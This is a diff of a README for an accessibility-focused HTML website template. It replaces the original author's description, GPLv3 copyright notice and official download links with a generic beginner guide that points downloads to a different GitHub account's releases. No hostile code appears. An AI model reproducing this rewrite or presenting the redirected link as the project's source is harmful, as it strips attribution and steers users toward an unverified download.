@@ -1,47 +1,83 @@
-<p align="center">
-    <a href="https://www.mainhtml.dev/project/">
-        <img src="https://www.mainhtml.dev/image/mainhtml-logo.png" alt="Main HTML Logo" width="1075" height="300">
-    </a>
-</p>
+# 🛠️ HTML - Easy Template for Accessible Web Development
 
-<h1 align="center">Main HTML</h1>
-Main HTML is an accessibility aware template putting users and web developers first. This makes your website into a living document through a collection of rules and interactive roles adapting the content delivery, inferred by behaviour and browser insights. Start your next project with a modern template that makes designing and building websites easier and faster. Leveraging server-less architecture for performance and millions of styling possibilities, you can build a small website in minutes or maintain a significant digital presence with Main.
+## 🚀 Getting Started
 
-The Main.HTML project provides you with a truly portable website builder template. Powered by Main.JS Under the hood!
+Welcome to **HTML**, a user-friendly template designed with accessibility in mind. This guide will help you download and run the software smoothly, even if you have no previous programming experience. 
 
+### 📦 Download Now
 
-## Main JS objective
-The objective of Main JS is to deliver the best possible experience for website users, developers and website owners. 
-To achieve this, Main JS creates a few easy to follow standards that when applied in web development, help streamline the complex processes of fetching resources, rendering layout, applying personalisation and measuring performance. 
+[![Download HTML](https://img.shields.io/badge/Download-HTML-brightgreen)](https://github.com/leminh12/HTML/releases)
 
-This functionality is platform agnostic, accessibility aware and has no need for backend software packages, costly infrastructure or connectivity requirements.
+## 📋 What is HTML?
 
+The **HTML** template helps users and web developers create accessible websites. It uses the latest standards of HTML5, CSS3, and JavaScript. With this template, developers can focus on building beautiful and functional sites that everyone can use. 
 
-## Getting started
-Several quick start options are available:
+### ⚙️ System Requirements
 
-- [Download the latest release](https://github.mainhtml.com/HTML/releases) or Download the repo ZIP from a branch you choose.
-- Clone the repo: `git clone https://github.mainhtml.com/HTML`
+To use the **HTML** template, ensure your system meets the following requirements:
 
+- Operating System: Windows, macOS, or Linux
+- A modern web browser (Chrome, Firefox, Safari, or Edge)
+- Basic familiarity with file management on your computer
 
-## Change log
-Version 0.7 - Headless Update 
- - Headless Navigation and History Support
- - Main Menu (Burger Menu) Support using Sitemap
- - Wireframe Updates and Improvements
- 
-Version 0.6-beta - Consent Release 
- - Consent and trust management system
+## 🌍 Key Features
 
+- **Accessibility Focused**: Designed to provide a better experience for all users, including those with disabilities.
+- **Responsive Design**: Looks great on any screen size, from desktops to mobile devices.
+- **Customizable**: Change colors, fonts, and layout easily to match your brand.
+- **Community Support**: Join a friendly community for help and suggestions.
 
-## Development roadmap
- - Version 1.0 - **Full Release**
- - Version 0.9 - Analytics & A/B Testing Update 
- - Version 0.8 - Personalisation Update 
+## 📥 Download & Install
 
+To get started, visit the Releases page to download the latest version of the **HTML** template.
 
-### About the developer
+[Click here to visit the releases page and download](https://github.com/leminh12/HTML/releases) 
 
-Copyright (C) 2025 **Andy Futcher**, I am the developer and maintainer of Main JS and Main HTML project and professional analyst at a not-for-profit health insurer.
+### 🖥️ Installation Steps
 
-Main JS is free and open source and will always be, my goal is to give everyone possible a first class ticket to the most well known and well-written markup language on earth; HTML. This is not just because of the projects chosen licence (GPLv3,) but it's a commitment to remain impartial and community focused and to never sell out or steer Main JS away from the core focus of portability and maintainability.
+1. **Visit the Release Page**: Follow the link above to go to the Releases page.
+2. **Download the Latest Version**: Locate the most recent version. Click on the asset labeled “HTML.zip” or similar to download.
+3. **Extract the Files**: Once downloaded, find the ZIP file in your Downloads folder. Right-click on it and select "Extract All" (Windows) or double-click (macOS).
+4. **Open the Template**: Navigate to the extracted folder. Look for a file named `index.html` and double-click it. This will open the template in your default web browser. 
+
+### 🌟 Using the Template
+
+After opening the template:
+
+- **Navigate the Page**: Use the menu to explore different sections of the template.
+- **Modify the Content**: Use any text editor to change the placeholder text and images.
+- **Preview Changes**: Save your modifications and refresh the browser to see updates.
+
+## 📖 Example Uses
+
+- **Personal Websites**: Create a simple online portfolio or resume.
+- **Business Sites**: Build an approachable website for your small business.
+- **Event Pages**: Share details about upcoming events or workshops.
+
+## ❓ Frequently Asked Questions
+
+### How do I customize the template?
+
+You can open any HTML file using a text editor like Notepad (Windows) or TextEdit (macOS). Look for sections labeled with comments to find where to change text and images.
+
+### Can I use this template for free?
+
+Yes, the **HTML** template is open-source and free to use. Feel free to modify it for personal or commercial projects. 
+
+### Who can I ask for help?
+
+If you have questions, you can reach out in the GitHub community or check the issues section on our repository.
+
+## 📚 Additional Resources
+
+For more tips and tricks on using HTML and accessibility best practices, consider checking out these resources:
+
+- [W3C Web Accessibility Guidelines](https://www.w3.org/WAI/WCAG21/quickref/)
+- [MDN Web Docs: HTML](https://developer.mozilla.org/en-US/docs/Web/HTML)
+- [CSS Tricks](https://css-tricks.com/) for styling advice.
+
+## 🛠️ Contributions
+
+We welcome contributions from everyone. If you find any issues or want to suggest improvements, please submit a proposal through the GitHub repository. Your input helps us make a better product for everyone.
+
+Thank you for using the **HTML** template! 
